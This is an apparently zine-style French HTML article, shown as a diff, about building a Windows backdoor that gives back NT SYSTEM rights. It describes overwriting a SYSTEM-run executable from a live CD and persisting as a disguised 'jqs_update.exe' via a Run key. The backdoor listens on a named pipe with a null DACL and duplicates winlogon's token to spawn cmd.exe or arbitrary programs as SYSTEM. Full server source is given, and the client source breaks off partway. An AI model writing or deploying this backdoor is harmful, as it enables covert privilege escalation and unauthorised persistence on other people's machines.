@@ -1,0 +1,758 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+	"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <title>LOTFREE9</title>
+  </head>
+  <body>
+    <h1>Une backdoor windows locale pour récupérer les droits NT SYSTEM</h1>
+    <p>Quand on a récupéré des droits privilégiés sur une machine par une attaque physique (comprendre locale), on aime bien les conserver et que cela se fasse dans la discrétion...<br />
+    Passer son user en admin local ou en power-user ce n'est pas ce qu'il y a de plus discret. Quand à casser le mdp du compte admin existant ce n'est pas toujours une mince affaire (du moins si la compatiblité LanMan est désactivée)<br />
+    Le top c'est d'avoir à disposition de quoi lancer quand on le souhaite une commande nous permettant de récupérer temporairement les droits que l'on souhaite histoire d'installer une app, lancer un sniffeur, récupérer des fichiers etc. Et c'est le sujet de cet article.</p>
+
+    <p>L'idée d'origine est bien sûr venue d'une telle situation dans un environement Windows. On a accès à une machine avec un compte limité, on est tout seul et on peut faire démarrer cette bécane sur un live CD, monter le système de fichier et placer un de nos exécutables sur le système.<br />
+    La question a ensuite été de comment faire en sorte que l'exécutable placé sur le disque puisse nous donner ce que l'on souhaite à savoir un max de droits d'accès, c'est à dire les droits NT SYSTEM...</p>
+
+    <p>Placer les exécutables dans une clé Run du registre (au boot) ne suffit pas à faire tourner les exécutables en SYSTEM : Ces clés lancent les programmes quand l'user ouvre sa session avec ses droits à lui. J'ai fouillé dans les processus qui tourneaient en system sur mon PC et trouvé notemment GoogleUpdate.exe, un exe qui comme son nom l'indique est ajouté lors de l'installation de logiciels de chez Google (comme Chrome).<br />
+    Ce qui était étonnant c'est que cet exécutable était justement dans les clés Run du registre... En fait j'ai découvert plus tard qu'il était aussi lancé en tant que tâche planifiée et que c'était ce qui le faisait tourner en tant que SYSTEM. Mais on y reviendra à la fin de l'article ;-)</p>
+
+    <p>Quoiqu'il en soit la première étape était résolue : On écrase le fichier GoogleUpdate.exe (ou tout autre programme qui tourne en SYSTEM, relevé via le taskmgr) par un programme de notre confection via un live CD, on reboot sous Windows et hop, notre prog tourne en SYSTEM :)</p>
+
+    <p>Vient ensuite la question de la communication avec le programme : Il faut qu'il tourne &quot;dans l'ombre&quot; en attente de nos commandes et qu'il les exécute quand on les lui envoie.<br />
+    Pour ça différents techniques sont à notre disposition : créer un fichier contenant les commandes qui serait lues puis le fichier supprimé (pas pratique), communiquer via des sockets (pas terrible face à un netstat ou nmap), via des clés de registre (pas terrible) ou via des tubes nommés.</p>
+
+    <p>Va pour les tubes. On créé un petit programme de test histoire de jouer avec les tubes : un clien et un serveur. On utilise la fonction <em>CreateNamedPipe</em> pour créer notre canal de communication qu'on met en écoute via <em>ConnectNamedPipe</em> (l'équivalent de <em>listen</em> pour les sockets) et ensuite on se sert bêtement de <em>WriteFile</em> et <em>ReadFile</em> pour communiquer. Seul problème : une fois lancé en SYSTEM le tube existe bien mais impossible pour le client d'ouvrir la pipeline car des mécanismes de sécurité existent pour que tout le monde n'accéde pas à ce tube (comme pour des fichiers). Il faut donc à la création du tube indiquer des droits spécifiques permettant à tout le monde d'y accéder.<br />
+    Cette opération se fait lors de la création du pipe en passant comme dernier argument une structure SECURITY_ATTRIBUTES que l'on aura initialisé via <em>InitializeSecurityDescriptor</em> puis correctement rempli avec <em>SetSecurityDescriptorDacl</em>. L'opération dans notre cas est assez simple : il convient de passer NULL comme 3ème paramêtre (pDacl) pour indiquer que tout le monde a les accès.</p>
+
+    <p>Pour reprendre sur les communications entre le client et le serveur, le protocole choisi sera le suivant :<br />
+    Lorsqu'un client se connecte au serveur (ouverture du tube), ce dernier envoi le message d'accueil <em>I'm here to serve you master.</em> au client. Cela permet au client de vérifier que la connexion a bien été établie. Evidemment on peut placer un message plus discret pour éviter aux curieux d'analyser la situation dans les détails :p</p>
+
+    <p>C'est ensuite le client qui spécifie ce qu'il souhaite. La commande CWD empruntée au FTP permet d'afficher le répertoire courant du processus serveur. Suvi d'un argument elle permet de lui faire changer de répertoire courant. La commande CMD sera la plus pratique, facile et sans doute la plus fiable à utiliser : elle ouvrera un shell (cmd.exe) dans l'environement de l'utilisateur et ce avec les droits SYSTEM.</p>
+
+    <p>Enfin la commande RUN permettra comme son nom l'indique de lancer un exécutable avec les droits SYSTEM. Il faudra forcément passer comme argument le chemin de l'exécutable voulu. Il est préférable d'avoir CWD dans son dossier auparavant. On pourra transférer des paramêtres à ce programme en rajoutant à la fin de la commande RUN les options séparées par le caractère '|' (ex: <em>RUN ping.exe|8.8.8.8</em> pour pinger le serveur DNS de Google).</p>
+
+    <p>Seulement si on lance depuis le client un CMD ou un RUN quelquechose, la fenêtre du programme n'apparait pas alors que l'on voit bien le processus demandé exécuté en tant que SYSTEM dans le gestionnaire des taches... C'est parce que Windows inclus des mécanismes de sécurité de la session graphique qui sont apparu aux fur et à mesure des versions, par exemple pour se prrotéger des <a href="http://en.wikipedia.org/wiki/Shatter_attack">shatter attacks</a>. On pourrait comparer ce système basé sur des jetons (tokens) et sessions au système xauth de Linux et ses magic-cookies mais sur ce niveau <a href="http://theinvisiblethings.blogspot.com/2011/04/linux-security-circus-on-gui-isolation.html">Windows est beaucoup plus avancé</a>.</p>
+
+    <p>Comment alors faire en sorte que notre exécutable tournant en SYSTEM ait accès à la session en cours et puisse générer des processus avec ses privilèges dans cette même session ?<br />
+    C'est sans doute sur le site CodeProjet que l'on trouve <a href="http://www.codeproject.com/KB/vista-security/">la plus intéressante bibliothèque de documents</a> traitant de ces mécanismes de sécurité, et en particulier (pour notre cas), le document <a href="http://www.codeproject.com/KB/vista-security/VistaSessions.aspx">Launch your application in Vista under the local system account without the UAC popup</a> qui nous explique la marche à suivre pour accéder au saint graal :)</p>
+
+    <p>Quand vous vous loguez physiquement sur un système Windows Vista/7, une session est générée qui aura l'identifiant 1. Les services lancés par Windows au boot tournent sous une session différente, non-interactive où les applis n'ont pas accès à l'interface graphique : la session 0.<br />
+    Vous pouvez connaître l'ID de session de chaque processus via <em>Affichage &gt; Sélectionner des colonnes</em> dans le gestionnaire des tâches et vous verrez qu'il y a quand même des processus SYSTEM tournant dans notre session 1. On retrouve alors le GoogleUpdate.exe et, comme sur tous les systèmes, vous verrez le winlogon.exe qui gère le login/logout des utilisateurs. Il y a en gros un processus winlogon.exe tournant en SYSTEM pour chaque session dont l'ID est supérieur ou égal à 1.</p>
+
+    <p>L'idée est de récupérer le jeton de winlogon.exe qui lui permet d'avoir accès à l'interface graphique et chaque fois qu'on enverra une commande à notre backdoor, la commande sera lancée avec ce token, faisant apparaître le fenêtre correspondante à l'écran :)</p>
+
+    <p>Le procédé à suivre pour arriver à nos fins sera le suivant :</p>
+    <ul>
+      <li>Récupérer l'ID de la session physique en cours. On peut faire ça via la fonction <em>WTSGetActiveConsoleSessionId</em></li>
+      <li>Obtenir le token de la session user en cours par <em>WTSQueryUserToken</em></li>
+      <li>Récupérer le PID de winlogon.exe. Pour cela on va énumérer les processus avec <em>CreateToolhelp32Snapshot</em> et tourner jusqu'à trouver le bon processus</li>
+      <li>Ouvrir le process winlogon.exe par <em>OpenProcess</em> et en extraire le token via <em>OpenProcessToken</em></li>
+      <li>Grace à <em>DuplicateTokenEx</em> on fait un duplicatat de ce token</li>
+      <li>A ce token on associe la session de l'utilisateur que l'on souhaite via <em>SetTokenInformation</em></li>
+      <li>On créé un environnement en se basant sur ce token avec <em>CreateEnvironmentBlock</em></li>
+      <li>Notre processus est finalement lancé avec <em>CreateProcessAsUser</em> qui prendra comme argument le token dupliqué, l'environnement créé, le nom de l'exe, ses arguments ainsi qu'une structure STARTUPINFO dont la valeur lpDesktop doit être définie à <em>winsta0\default</em> (c'est une chaine définie par Microsoft pour indiquer que l'appli sera interractive)</li>
+      <li>Enjoy ;-)</li>
+    </ul>
+
+    <p><strong>Voici le code source de la partie serveur destinée à tourner avec des droits SYSTEM</strong>. Compilation avec Microsoft Visual C++ Express (gratuit) en raison de l'utilisation de certaines bibliothèques.<br />
+    Le code est un peu crado. En mode debug des messages de statut sont envoyés vers le fichier d'event (journal) d'application.</p>
+
+    <pre>/*
+LOTFREE 9 - Get NT SYSTEM privileges backdoor
+Le programme utilise TCHAR &amp; co mais est fait pour unicode
+cela dis le passage non-unicode ne necessite pas grandes modifications
+*/
+#define UNICODE
+#define _UNICODE
+#define _CRT_SECURE_NO_WARNINGS
+
+// Fonctions acces registre, tokens etc
+#pragma comment (lib, &quot;advapi32&quot;)
+// WTSQueryUserToken 
+#pragma comment (lib, &quot;Wtsapi32&quot;)
+// CreateEnvironmentBlock
+#pragma comment (lib, &quot;Userenv&quot;)
+
+#include &lt;tchar.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;Windows.h&gt;
+// CreateToolhelp32Snapshot
+#include &lt;Tlhelp32.h&gt;
+#include &lt;Wtsapi32.h&gt;
+#include &lt;Userenv.h&gt;
+// ConvertStringSecurityDescriptorToSecurityDescriptorS
+#include &lt;Sddl.h&gt;
+
+#define BUFSIZE 512
+
+DWORD WINAPI InstanceThread(LPVOID);
+
+int _tmain(int argc, TCHAR *argv[])
+{
+    BOOL   fConnected = FALSE;
+    DWORD  dwThreadId = 0;
+    HANDLE hPipe = INVALID_HANDLE_VALUE, hThread = NULL;
+    LPCTSTR lpszPipename = _T(&quot;\\\\.\\pipe\\mynamedpipe&quot;);
+    LPTSTR lpDisplayBuf;
+    TCHAR  orig_name[255];
+    TCHAR  dest_name[255];
+    HKEY key;
+    PSECURITY_ATTRIBUTES pSa = NULL;
+
+    SECURITY_ATTRIBUTES sa ={0};
+    SECURITY_DESCRIPTOR sd={0};
+
+    // Creer un security descriptor vide
+    InitializeSecurityDescriptor(&amp;sd, SECURITY_DESCRIPTOR_REVISION);
+
+    // 3eme parametre : DACL NULL =&gt; permettre tous les acces
+    SetSecurityDescriptorDacl(&amp;sd, TRUE, NULL, FALSE);
+
+    sa.bInheritHandle = false;
+    sa.lpSecurityDescriptor = &amp;sd;
+    sa.nLength = sizeof(sa);
+
+    if (argc == 2)
+    {
+        // si argument = &quot;install&quot;, place l'executable comme service lance au boot
+        if(_tcscmp(_T(&quot;install&quot;), argv[1]) == 0)
+        {
+            // Obtient le nom de l'exe en cours
+            GetModuleFileName(NULL, orig_name, 255);
+            // Obtenir l'emplacement des fichiers systemes
+            GetSystemDirectory(dest_name, 255);
+            _tcscat(dest_name, _T(&quot;\\jqs_update.exe&quot;));
+            _tprintf(_T(&quot;%s\n&quot;), dest_name);
+            // On y place une copie de l'excutable sous le nom jqs_update.exe
+            CopyFile(orig_name, dest_name, FALSE);
+
+            // Creation du cle Run dans le registre pour lancement au boot
+            if(RegOpenKeyEx(HKEY_CURRENT_USER,
+                _T(&quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot;),
+                0,
+                KEY_SET_VALUE,
+                &amp;key) == ERROR_SUCCESS)
+                {
+                    if(RegSetValueEx(key,
+                        _T(&quot;jqs_update&quot;),
+                        0,
+                        REG_SZ,
+                        (BYTE*)dest_name,
+                        11) != ERROR_SUCCESS)
+                        _tprintf(_T(&quot;Registry install failed&quot;));
+                    RegCloseKey(key);
+                }
+            // On quitte : install terminee
+            return 0;
+        }
+    }
+
+    // Cas ou le programme est lance sans arguments
+    for (;;)
+    {
+        // cree le tube nomme pour les communications avec des acces pour tout le monde
+        _tprintf( _T(&quot;\nServer: Awaiting client connection on %s\n&quot;), lpszPipename);
+        hPipe = CreateNamedPipe(
+                    lpszPipename,             // pipe name
+                    PIPE_ACCESS_DUPLEX | WRITE_DAC,       // read/write access
+                    PIPE_TYPE_MESSAGE |       // message type pipe
+                    PIPE_READMODE_MESSAGE |   // message-read mode
+                    PIPE_WAIT,                // blocking mode
+                    PIPE_UNLIMITED_INSTANCES, // max. instances
+                    BUFSIZE,                  // output buffer size
+                    BUFSIZE,                  // input buffer size
+                    0,                        // client time-out
+                    &amp;sa);                    // default security attribute - null avant
+
+        if (hPipe == INVALID_HANDLE_VALUE)
+        {
+            // Ca a merde... affiche un message
+            FormatMessage(
+                FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
+                NULL,
+                GetLastError(),
+                MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
+                (LPTSTR)&amp;lpDisplayBuf,
+                0, NULL );
+            _tprintf(_T(&quot;%s&quot;), (LPSTR)lpDisplayBuf);
+            // et quitte
+            return -1;
+        }
+
+        // Attendre que des clients se connectent; en cas de reussite,
+        // retourne une valeur non nulle. Dans le cas contraire
+        // (retourne zero), GetLastError retourne ERROR_PIPE_CONNECTED.
+
+        fConnected = ConnectNamedPipe(hPipe, NULL) ?
+                     TRUE : (GetLastError() == ERROR_PIPE_CONNECTED);
+
+        if (fConnected)
+        {
+            _tprintf(_T(&quot;Client connected, creating a processing thread.\n&quot;));
+
+            // Creation d'un thread pour gerer ce client
+            hThread = CreateThread(
+                NULL,              // no security attribute
+                0,                 // default stack size
+                InstanceThread,    // Thread qui gere la cnx avec le client :)
+                (LPVOID) hPipe,    // thread parameter
+                0,                 // not suspended
+                &amp;dwThreadId);      // returns thread ID
+
+            if (hThread == NULL)
+            {
+                // Ca a merde... affiche l'erreur et quitte
+                FormatMessage(
+                    FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
+                    NULL,
+                    GetLastError(),
+                    MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
+                    (LPTSTR)&amp;lpDisplayBuf,
+                    0, NULL );
+                return -1;
+            }
+            else CloseHandle(hThread);
+        }
+        else CloseHandle(hPipe); // The client could not connect, so close the pipe.
+    } // end for
+    LocalFree(lpDisplayBuf);
+    return 0;
+}
+
+// Thread qui gere le client connecte
+DWORD WINAPI InstanceThread(LPVOID lpvParam)
+{
+    HANDLE hHeap      = GetProcessHeap();
+    TCHAR* pchRequest = (TCHAR*)HeapAlloc(hHeap, 0, BUFSIZE*sizeof(TCHAR));
+    TCHAR* pchReply   = (TCHAR*)HeapAlloc(hHeap, 0, BUFSIZE*sizeof(TCHAR));
+
+    DWORD cbBytesRead = 0, cbReplyBytes = 0, cbWritten = 0;
+    BOOL fSuccess = FALSE;
+    HANDLE hPipe  = NULL;
+    LPTSTR arg1;
+    LPTSTR arg2;
+    TCHAR lpDisplayBuf[256];
+
+// En mode debug, des messages d'erreur ou de reussite sont passes dans le journal des applications
+#ifdef _DEBUG
+    HANDLE hEventLog = NULL;
+#endif
+
+    LPTSTR lpszStrings[1];
+    TCHAR cmdLine[256];
+    
+    //pompage
+    PROCESS_INFORMATION pi;
+    STARTUPINFO si;
+    BOOL bResult = FALSE;
+    DWORD dwSessionId, winlogonPid;
+    HANDLE hUserToken, hUserTokenDup, hPToken, hProcess;
+    DWORD dwCreationFlags;
+
+#ifdef _DEBUG
+    hEventLog = RegisterEventSource(NULL, _T(&quot;LOTF&quot;));
+#endif
+
+    // Recupere l'identifiant de la session physique en cours sur la machine
+    dwSessionId = WTSGetActiveConsoleSessionId();
+
+    // Recupere le PID de winlogon.exe
+    PROCESSENTRY32 procEntry;
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnap == INVALID_HANDLE_VALUE)
+    {
+        return 1 ;
+    }
+    procEntry.dwSize = sizeof(PROCESSENTRY32);
+    if (!Process32First(hSnap, &amp;procEntry))
+    {
+        return 1;
+    }
+    do
+    {
+        if (_tcsicmp(procEntry.szExeFile, _T(&quot;winlogon.exe&quot;)) == 0)
+        {
+            // Processus winlogon trouve...
+            // make sure it's running in the console session
+            DWORD winlogonSessId = 0;
+            if (ProcessIdToSessionId(procEntry.th32ProcessID, &amp;winlogonSessId) 
+                    &amp;&amp; winlogonSessId == dwSessionId)
+            {
+                winlogonPid = procEntry.th32ProcessID;
+                break;
+            }
+        }
+    } while (Process32Next(hSnap, &amp;procEntry));
+
+    // Recupere le token de la session physique en cours. Seul SYSTEM peut faire ca.
+    WTSQueryUserToken(dwSessionId,&amp;hUserToken);
+    dwCreationFlags = NORMAL_PRIORITY_CLASS|CREATE_NEW_CONSOLE;
+    ZeroMemory(&amp;si, sizeof(STARTUPINFO));
+    si.cb = sizeof(STARTUPINFO);
+    si.lpDesktop = _T(&quot;winsta0\\default&quot;);
+    ZeroMemory(&amp;pi, sizeof(pi));
+    TOKEN_PRIVILEGES tp;
+    LUID luid;
+
+    // Retourne un handle sur le process winlogon.exe
+    hProcess = OpenProcess(MAXIMUM_ALLOWED, FALSE, winlogonPid);
+
+    if(hProcess == NULL)
+    {
+        FormatMessage(
+        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
+        NULL,
+        GetLastError(),
+        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
+        (LPTSTR)&amp;lpDisplayBuf,
+        0, NULL);
+    }
+    else
+    {
+        _tcscpy(lpDisplayBuf, _T(&quot;OpenProcessToken : tout est ok!&quot;));
+    }
+    lpszStrings[0] = lpDisplayBuf;
+#ifdef _DEBUG
+   ReportEvent(hEventLog, EVENTLOG_INFORMATION_TYPE, 1, 666, NULL, 1, 0, (LPCTSTR*) &amp;lpszStrings[0], NULL);
+#endif
+
+    // Recupere le token d'acces de winlogon.exe avec les droits de duplication
+    if(!OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY
+           |TOKEN_DUPLICATE|TOKEN_ASSIGN_PRIMARY| TOKEN_ADJUST_SESSIONID
+                    |TOKEN_READ|TOKEN_WRITE, &amp;hPToken))
+    {
+        //_tprintf(_T(&quot;Process token open Error: %u\n&quot;), GetLastError());
+        FormatMessage(
+        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
+        NULL,
+        GetLastError(),
+        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
+        (LPTSTR)&amp;lpDisplayBuf,
+        0, NULL);
+    }
+    else
+    {
+        _tcscpy(lpDisplayBuf, _T(&quot;OpenProcessToken : tout est ok!&quot;));
+    }
+    lpszStrings[0] = lpDisplayBuf;
+#ifdef _DEBUG
+   ReportEvent(hEventLog, EVENTLOG_INFORMATION_TYPE, 1, 667, NULL, 1, 0, (LPCTSTR*) &amp;lpszStrings[0], NULL);
+#endif
+
+    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;luid))
+    {
+        FormatMessage(
+        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
+        NULL,
+        GetLastError(),
+        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
+        (LPTSTR)&amp;lpDisplayBuf,
+        0, NULL);
+    }
+    else
+    {
+      _tcscpy(lpDisplayBuf, _T(&quot;LookupPrivilege: ok!&quot;));
+    }
+    lpszStrings[0] = lpDisplayBuf;
+#ifdef _DEBUG
+   ReportEvent(hEventLog, EVENTLOG_INFORMATION_TYPE, 1, 668, NULL, 1, 0, (LPCTSTR*) &amp;lpszStrings[0], NULL);
+#endif
+
+    tp.PrivilegeCount = 1;
+    tp.Privileges[0].Luid = luid;
+    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+    // Duplication du token de winlogon.exe vers hUserTokenDup
+    DuplicateTokenEx(hPToken, MAXIMUM_ALLOWED, NULL,
+        SecurityIdentification, TokenPrimary, &amp;hUserTokenDup);
+
+    // On associe le SID de la session physique au token duplique
+    SetTokenInformation(hUserTokenDup,
+        TokenSessionId,
+        (void*)dwSessionId, // SID de la session physique
+        sizeof(DWORD));
+
+    if (!AdjustTokenPrivileges(hUserTokenDup,
+        FALSE,
+        &amp;tp,
+        sizeof(TOKEN_PRIVILEGES),
+        (PTOKEN_PRIVILEGES)NULL,
+        NULL))
+    {
+        FormatMessage(
+            FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
+            NULL,
+            GetLastError(),
+            MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
+            (LPTSTR)&amp;lpDisplayBuf,
+            0, NULL );
+    }
+    else
+    {
+        _tcscpy(lpDisplayBuf, _T(&quot;AdjustTokenPrivileges: c'est ok!&quot;));
+    }
+    lpszStrings[0] = lpDisplayBuf;
+#ifdef _DEBUG
+   ReportEvent(hEventLog, EVENTLOG_INFORMATION_TYPE, 1, 669, NULL, 1, 0, (LPCTSTR*) &amp;lpszStrings[0], NULL);
+#endif
+
+    LPVOID pEnv = NULL;
+
+    // Recupere l'environement du token duplique
+    if(CreateEnvironmentBlock(&amp;pEnv, hUserTokenDup, TRUE))
+    {
+        dwCreationFlags |= CREATE_UNICODE_ENVIRONMENT;
+        _tcscpy(lpDisplayBuf, _T(&quot;CreateEnvironmentBlock: c'est ok!&quot;));
+    }
+    else
+    {
+        pEnv= NULL;
+        FormatMessage(
+            FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
+            NULL,
+            GetLastError(),
+            MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
+            (LPTSTR)&amp;lpDisplayBuf,
+            0, NULL );
+    }
+    lpszStrings[0] = lpDisplayBuf;
+
+#ifdef _DEBUG
+   ReportEvent(hEventLog, EVENTLOG_INFORMATION_TYPE, 1, 670, NULL, 1, 0, (LPCTSTR*) &amp;lpszStrings[0], NULL);
+#endif
+
+//paste end
+
+    // Erreurs possible avec le thread. Si NOK on quitte
+    if (lpvParam == NULL)
+    {
+        _tprintf(_T(&quot;\nERROR - Pipe Server Failure:\n&quot;));
+        _tprintf(_T(&quot;   InstanceThread got an unexpected NULL value in lpvParam.\n&quot;));
+        _tprintf(_T(&quot;   InstanceThread exitting.\n&quot;));
+        if (pchReply != NULL) HeapFree(hHeap, 0, pchReply);
+        if (pchRequest != NULL) HeapFree(hHeap, 0, pchRequest);
+        return (DWORD)-1;
+    }
+
+    // On recupere le handle de notre pipe
+    hPipe = (HANDLE) lpvParam;
+
+    // On envoi un message d'accueil a ce cher client qui a bien voulu se connecter
+    _tcscpy(pchReply, _T(&quot;I'm here to serve you master.&quot;));
+    cbReplyBytes = _tcsclen(pchReply) * sizeof(TCHAR);
+    fSuccess = WriteFile(
+                   hPipe,
+                   pchReply,
+                   cbReplyBytes,
+                   &amp;cbWritten,
+                   NULL);
+
+    // Loop until done reading
+    while (1)
+    {
+        fSuccess = ReadFile(
+                       hPipe,
+                       pchRequest,
+                       BUFSIZE * sizeof(TCHAR),
+                       &amp;cbBytesRead,
+                       NULL);
+
+        if (!fSuccess || cbBytesRead == 0)
+        {
+            if (GetLastError() == ERROR_BROKEN_PIPE)
+            {
+                _tprintf(_T(&quot;InstanceThread: client disconnected.\n&quot;));
+            }
+            else
+            {
+                _tprintf(_T(&quot;InstanceThread ReadFile failed, GLE=%lu.\n&quot;), GetLastError());
+            }
+            break;
+        }
+
+        pchRequest[cbBytesRead / sizeof(TCHAR) - 1] = _T('\0');
+
+        // Instruction CWD =&gt; change de repertoire courant
+        if(_tcsnccmp(pchRequest, _T(&quot;CWD&quot;), 3) == 0)
+        {
+            if(_tcsclen(pchRequest) &gt; 3)
+            {
+                arg1 = _tcsspnp(&amp;pchRequest[3], _T(&quot; &quot;));
+                if(arg1 != NULL) SetCurrentDirectory(arg1); // pas de gestion d'erreur
+            }
+            GetCurrentDirectory(255, pchReply);
+        }
+        // Instruction RUN =&gt; execute un programme, permet de passer des arguments
+        else if (_tcsnccmp(pchRequest, _T(&quot;RUN&quot;), 3) == 0)
+        {
+            if(_tcsclen(pchRequest) &gt; 3)
+            {
+                arg1 = _tcsspnp(&amp;pchRequest[3], _T(&quot; &quot;));
+                if(arg1 != NULL)
+                {
+                    arg2 = _tcschr(arg1, _T('|'));
+                    if(arg2 != NULL)
+                    {
+                        _tprintf(_T(&quot;%s\n&quot;), arg2);
+                        arg2[0] = _T('\0');
+                        arg2 = _tcsinc(arg2);
+                    }
+
+                    _sntprintf(cmdLine, BUFSIZE - 1, _T(&quot;\&quot;%s\&quot; %s&quot;), arg1, arg2);
+
+                    bResult = CreateProcessAsUser(
+                        hUserTokenDup,   // client's access token
+                        arg1,            // fichier a executer
+                        cmdLine,         // ligne de commande (arguments)
+                        NULL,            // pointer to process SECURITY_ATTRIBUTES
+                        NULL,            // pointer to thread SECURITY_ATTRIBUTES
+                        FALSE,           // handles are not inheritable
+                        dwCreationFlags, // creation flags
+                        pEnv,            // pointer to new environment block
+                        NULL,            // name of current directory
+                        &amp;si,             // pointer to STARTUPINFO structure
+                        &amp;pi              // receives information about new process
+                    );
+                    if (bResult != NULL)
+                    {
+                        _tcscpy(pchReply, _T(&quot;CreateProcessAsUser Success!&quot;));
+                    }
+                    else
+                    {
+                        _tcscpy(pchReply, _T(&quot;CreateProcessAsUser Error!&quot;));
+                    }
+                }
+            }
+            else
+            {
+                _tcscpy(pchReply, _T(&quot;Need arguments!&quot;));
+            }
+        } // Fin RUN
+
+        // Execute cmd.exe (invite de commande avec droits SYSTEM)
+        else if (_tcsnccmp(pchRequest, _T(&quot;CMD&quot;), 3) == 0)
+        {
+            _tcscpy(lpDisplayBuf, _T(&quot;Juste avant CreateProcessAsUser&quot;));
+            lpszStrings[0] = lpDisplayBuf;
+#ifdef _DEBUG
+            ReportEvent(hEventLog, EVENTLOG_INFORMATION_TYPE, 1, 671, NULL, 1, 0, (LPCTSTR*) &amp;lpszStrings[0], NULL);
+#endif
+
+            // Launch the process in the client's logon session.
+
+            bResult = CreateProcessAsUser(
+                hUserTokenDup,                     // client's access token
+                _T(&quot;C:\\windows\\system32\\cmd.exe&quot;),
+                NULL,            // options
+                NULL,            // pointer to process SECURITY_ATTRIBUTES
+                NULL,            // pointer to thread SECURITY_ATTRIBUTES
+                FALSE,           // handles are not inheritable
+                dwCreationFlags, // creation flags
+                pEnv,            // pointer to new environment block
+                NULL,            // name of current directory
+                &amp;si,             // pointer to STARTUPINFO structure
+                &amp;pi              // receives information about new process
+            );
+            if (bResult != NULL)
+            {
+                _tcscpy(pchReply, _T(&quot;CreateProcessAsUser Success!&quot;));
+            }
+            else
+            {
+                _tcscpy(pchReply, _T(&quot;CreateProcessAsUser Error!&quot;));
+            }
+        }
+        // Message pour les curieux
+        else
+        {
+            _tcscpy(pchReply, _T(&quot;Protocol error #8486&quot;));
+        }
+        cbReplyBytes = _tcsclen(pchReply) * sizeof(TCHAR);
+
+        // Renvoi l'output sur le pipe
+        fSuccess = WriteFile(
+           hPipe,        // handle to pipe
+           pchReply,     // buffer to write from
+           cbReplyBytes, // number of bytes to write
+           &amp;cbWritten,   // number of bytes written
+           NULL);        // not overlapped I/O
+
+        if (!fSuccess || cbReplyBytes != cbWritten)
+        {
+            _tprintf(_T(&quot;InstanceThread WriteFile failed, GLE=%lu.\n&quot;), GetLastError());
+            break;
+        }
+    } // Fin while
+
+    // End impersonation of client
+    CloseHandle(hProcess);
+    CloseHandle(hUserToken);
+    CloseHandle(hUserTokenDup);
+    CloseHandle(hPToken);
+  
+    FlushFileBuffers(hPipe);
+    DisconnectNamedPipe(hPipe);
+    CloseHandle(hPipe);
+
+    HeapFree(hHeap, 0, pchRequest);
+    HeapFree(hHeap, 0, pchReply);
+
+#ifdef _DEBUG
+    _tprintf(_T(&quot;InstanceThread exitting.\n&quot;));
+    DeregisterEventSource(hEventLog);
+#endif
+    return 1;
+}
+    </pre>
+    <p><strong>Et voici le code (minimaliste) du client.</strong> Lit les commandes (CWD, CMD, RUN) depuis la console</p>
+    <pre>
+/* client */
+#define UNICODE
+#define _UNICODE
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;conio.h&gt;
+#include &lt;tchar.h&gt;
+#include &lt;stdlib.h&gt;
+
+#define BUFSIZE 512
+
+int _tmain(int argc, TCHAR *argv[])
+{
+    HANDLE hPipe;
+    char message[500]; // buffer pour la saisie a la console (stdin)
+	TCHAR wmessage[500]; // buffer de conversion en widechars
+    TCHAR  chBuf[BUFSIZE]; // Buffer de lecture sur le pipe
+    BOOL   fSuccess = FALSE;
+    DWORD  cbRead, cbToWrite, cbWritten, dwMode;
+	DWORD err = 0;
+    LPTSTR lpszPipename = _T(&quot;\\\\.\\pipe\\mynamedpipe&quot;);
+	size_t convertedChars = 0;
+
+    // Try to open a named pipe; wait for it, if necessary.
+    while(1)
+    {
+        hPipe = CreateFile(
+            lpszPipename,   // pipe name
+            GENERIC_READ |  // read and write access
+            GENERIC_WRITE,
+            0,              // no sharing
+            NULL,           // default security attributes
+            OPEN_EXISTING,  // opens existing pipe
+            0,              // default attributes
+            NULL);          // no template file
+
+        // Break if the pipe handle is valid.
+
+        if(hPipe != INVALID_HANDLE_VALUE) break;
+
+        // Exit if an error other than ERROR_PIPE_BUSY occurs.
+
+		err = GetLastError();
+
+		if(err == ERROR_ACCESS_DENIED)
+		{
+			_tprintf(_T(&quot;Acces refuse!\n&quot;));
+			return -1;
+		}
+		else if(err != ERROR_PIPE_BUSY)
+        {
+            _tprintf( _T(&quot;Could not open pipe. GLE=%lu\n&quot;), GetLastError());
+            return -1;
+        }
+
+        // All pipe instances are busy, so wait for 20 seconds.
+        if(!WaitNamedPipe(lpszPipename, 20000))
